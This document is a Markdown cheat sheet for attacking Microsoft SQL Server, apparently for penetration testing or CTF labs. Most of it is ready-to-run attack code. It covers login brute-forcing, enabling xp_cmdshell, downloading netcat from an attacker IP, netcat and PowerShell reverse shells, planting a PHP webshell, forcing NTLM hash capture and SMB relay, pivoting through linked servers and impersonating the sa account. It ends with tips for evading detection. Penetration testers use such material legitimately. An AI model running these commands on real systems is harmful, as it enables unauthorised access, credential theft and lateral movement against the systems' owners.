# MSSQL Enumeration

Enumerate and exploit Microsoft SQL Server instances to gain command execution, read files, steal hashes, and pivot to other systems.
MSSQL often runs with high privileges and can be leveraged for privilege escalation and lateral movement in Active Directory environments.

## Nmap MSSQL Scan
```bash
# Comprehensive MSSQL scan
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.10
```

## Metasploit MSSQL Enumeration
```bash
# MSSQL ping
use scanner/mssql/mssql_ping
set RHOSTS 10.10.10.10
run

# MSSQL login scanner
use scanner/mssql/mssql_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Authentication

### SQL Authentication
```bash
# Impacket mssqlclient
impacket-mssqlclient user:password@10.10.10.10

# Sqsh (Linux)
sqsh -S 10.10.10.10 -U user -P 'password' -h

# Sqlcmd (Windows)
sqlcmd -S 10.10.10.10 -U user -P 'password'
```

### Windows Authentication
```bash
# Domain authentication
impacket-mssqlclient domain/user:password@10.10.10.10 -windows-auth
sqsh -S 10.10.10.10 -U domain\\user -P 'password' -h -windows-auth

# Local account authentication
sqsh -S 10.10.10.10 -U SERVERNAME\\user -P 'password' -h -windows-auth
sqsh -S 10.10.10.10 -U .\\user -P 'password' -h -windows-auth
```

## Database Enumeration

### List Databases
```sql
-- Show all databases
SELECT name FROM sys.databases;
GO

-- Show current database
SELECT DB_NAME();
GO
```

### Select Database
```sql
USE database_name;
GO
```

### List Tables
```sql
-- List tables in current database
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE';
GO

-- List tables in specific database
SELECT table_name FROM database_name.INFORMATION_SCHEMA.TABLES;
GO
```

### List Columns
```sql
-- Get columns for specific table
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users';
GO
```

### Query Data
```sql
-- Select all from table
SELECT * FROM users;
GO

-- Select specific columns
SELECT username,password FROM users;
GO
```

## User Enumeration

### Current User
```sql
SELECT SYSTEM_USER;
GO

SELECT USER_NAME();
GO
```

### List Users
```sql
-- List all logins
SELECT name,sysadmin FROM syslogins;
GO

-- Check if current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

### User Impersonation

#### Check Impersonation Privileges
```sql
-- Find users we can impersonate
SELECT distinct b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
GO
```

#### Impersonate User
```sql
-- Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

## Command Execution

### Enable xp_cmdshell
```sql
-- Enable advanced options
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
GO

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

### Execute Commands
```sql
-- Execute command
EXEC xp_cmdshell 'whoami';
GO

-- Get system info
EXEC xp_cmdshell 'systeminfo';
GO

-- Check Windows version
EXEC xp_cmdshell 'powershell -command "[environment]::OSVersion.Version"';
GO
```

### Download Files
```sql
-- Download file with PowerShell
EXEC xp_cmdshell 'powershell -command "wget http://10.10.14.5/nc.exe -OutFile C:\Users\Public\nc.exe"';
GO

-- Download file with certutil
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.5/nc.exe C:\Users\Public\nc.exe';
GO
```

### Reverse Shell
```sql
-- Netcat reverse shell
EXEC xp_cmdshell 'C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe';
GO

-- PowerShell reverse shell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
GO
```

## File Operations

### Read Files
```sql
-- Read file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
GO

-- Read file with xp_cmdshell
EXEC xp_cmdshell 'type C:\Users\user\Desktop\flag.txt';
GO
```

### Write Files

#### Enable Ole Automation
```sql
-- Enable Ole Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
GO
```

#### Write File
```sql
-- Write PHP webshell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## Hash Capture

### Capture MSSQL Service Hash
```bash
# Start SMB server (attacker)
sudo impacket-smbserver share $(pwd) -smb2support

# Or use Responder
sudo responder -I tun0
```

```sql
-- Force authentication to attacker SMB server
EXEC master..xp_dirtree '\\10.10.14.5\share\';
GO

-- Alternative method
EXEC master..xp_subdirs '\\10.10.14.5\share\';
GO
```

## Linked Servers

### Enumerate Linked Servers
```sql
-- List linked servers
SELECT srvname, isremote FROM sysservers;
GO

-- Check linked server configuration
EXEC sp_linkedservers;
GO
```

### Query Linked Server
```sql
-- Execute query on linked server
EXECUTE('SELECT @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LINKED-SERVER\SQLEXPRESS];
GO

-- Check current user on linked server
EXECUTE('SELECT SYSTEM_USER') AT [LINKED-SERVER\SQLEXPRESS];
GO
```

### Enable xp_cmdshell on Linked Server
```sql
-- Enable xp_cmdshell on linked server
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED-SERVER\SQLEXPRESS];
EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED-SERVER\SQLEXPRESS];
GO

-- Execute command on linked server
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [LINKED-SERVER\SQLEXPRESS];
GO
```

### Double Hop (Nested Linked Servers)
```sql
-- Execute on doubly-linked server
EXECUTE('EXECUTE(''SELECT @@servername'') AT [SECOND-SERVER\SQLEXPRESS]') AT [FIRST-SERVER\SQLEXPRESS];
GO
```

## Privilege Escalation

### Check Privileges
```sql
-- Check server roles
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('db_owner');
GO

-- List all server role members
SELECT name FROM sys.server_principals WHERE type = 'S';
GO
```

### Impersonate SA Account
```sql
-- Attempt to impersonate sa
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
GO
```

## Lateral Movement

### Execute Commands on Remote MSSQL
```bash
# Using impacket
impacket-mssqlclient domain/user:password@10.10.10.10 -windows-auth

# Enable xp_cmdshell and execute
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### SMB Relay via MSSQL
```bash
# Start ntlmrelayx (attacker)
impacket-ntlmrelayx -t 10.10.10.20 -smb2support

# Force MSSQL to authenticate (victim)
EXEC master..xp_dirtree '\\10.10.14.5\share\';
```

## Notes

**Default Credentials:**
- Username: sa (System Administrator)
- Password: Often blank or weak on older installations
- Always try default credentials first

**Authentication Modes:**
- Windows Authentication: Uses AD credentials, more secure
- SQL Authentication: Username/password stored in SQL Server
- Mixed Mode: Supports both authentication types

**Dangerous Settings:**
- xp_cmdshell enabled: Direct command execution
- Ole Automation enabled: File write capabilities
- Impersonation privileges: Privilege escalation vector
- Linked servers: Lateral movement opportunities

**Service Account:**
- MSSQL often runs as domain service account (e.g., sql_svc)
- Service account may have high privileges in AD
- Capturing service hash can lead to domain compromise

**Ports:**
- 1433: Default MSSQL port
- 1434: MSSQL Browser Service (UDP)
- Dynamic ports: MSSQL can run on non-standard ports

**Linked Servers:**
- Allow querying other SQL servers or databases
- Can chain multiple servers for lateral movement
- May have different authentication contexts
- Check for trust relationships between servers

**User Impersonation:**
- IMPERSONATE privilege allows assuming another user's context
- Can escalate from low-privileged user to sysadmin
- Check for impersonation rights with sys.server_permissions

**File Operations:**
- Read: OPENROWSET with BULK option
- Write: Requires Ole Automation Procedures
- Both require appropriate file system permissions

**Command Execution Methods:**
- xp_cmdshell: Most common, requires sysadmin
- Ole Automation: Can write files and execute code
- SQL Server Agent Jobs: Scheduled task execution
- CLR Assemblies: Custom .NET code execution
- Extended stored procedures: DLL-based execution

**Detection Evasion:**
- xp_cmdshell is heavily monitored
- Consider using alternative execution methods
- Ole Automation may be less detected
- Linked server queries can bypass some monitoring
